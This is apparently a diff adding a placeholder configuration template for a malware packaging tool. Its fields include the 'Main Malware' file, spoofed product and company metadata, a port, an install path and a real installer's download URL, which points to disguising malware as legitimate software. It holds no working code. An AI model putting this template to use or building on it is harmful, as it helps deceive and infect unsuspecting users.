@@ -1,0 +1,25 @@
+[Installer Name: Used for packaging DONT INCLUDE EXE]
+INSTALLER
+[Installer Description]
+INSTALLERDescription
+[Main File Name: The Main Malware DONT INCLUDE EXE]
+MAINFILE
+[Product Name]
+PRODUCTNAME
+[File Description]
+PROGRAMDESCRIPTION
+[Software Version]
+SOFTWAREVERSION
+[Company Name]
+COMPANYNAME
+ 
+
+[PORT]
+PUTPORTHERE
+
+[InstallLocation]
+FULLPATHLOCATION
+
+[Real Installer Download]
+URLTODOWNLOAD
+
